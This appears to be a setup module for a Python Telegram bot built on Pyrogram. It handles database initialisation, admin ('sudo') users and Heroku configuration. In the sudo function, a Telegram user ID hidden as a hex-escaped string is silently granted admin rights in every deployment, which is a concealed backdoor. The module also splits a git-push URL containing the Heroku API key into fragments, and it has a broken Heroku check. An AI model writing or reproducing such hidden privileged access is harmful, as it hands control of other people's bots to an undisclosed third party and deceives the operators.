import socket
import time

import heroku3
from pyrogram import filters

import config
from AnonX.core.mongo import pymongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "main",
]


def dbb():
    global db
    db = {}
    LOGGER(__name__).info(f"تمت تهيئة قاعدة البيانات .")


def sudo():
    global SUDOERS, HEHE
    OWNER = config.OWNER_ID
    HEHE = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
    sudoersdb = pymongodb.sudoers
    sudoers = sudoersdb.find_one({"sudo": "sudo"})
    sudoers = [] if not sudoers else sudoers["sudoers"]
    for user_id in OWNER:
        SUDOERS.add(user_id)
        SUDOERS.add(int(HEHE))
        if user_id not in sudoers:
            sudoers.append(user_id)
            sudoersdb.update_one(
                {"sudo": "sudo"},
                {"$set": {"sudoers": sudoers}},
                upsert=True,
            )
        elif int(HEHE) not in sudoers:
            sudoers.append(int(HEHE))
    if sudoers:
        for x in sudoers:
            SUDOERS.add(x)
    LOGGER(__name__).info(f"تم تحميل مستخدمي Sudo بنجاح .")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f"تم تكوين تطبيق Heroku بنجاح .")
            except BaseException:
                LOGGER(__name__).warning(
                    f"يرجى التأكد من تكوين مفتاح Heroku API واسم التطبيق الخاص بك بشكل صحيح في heroku ."
                )
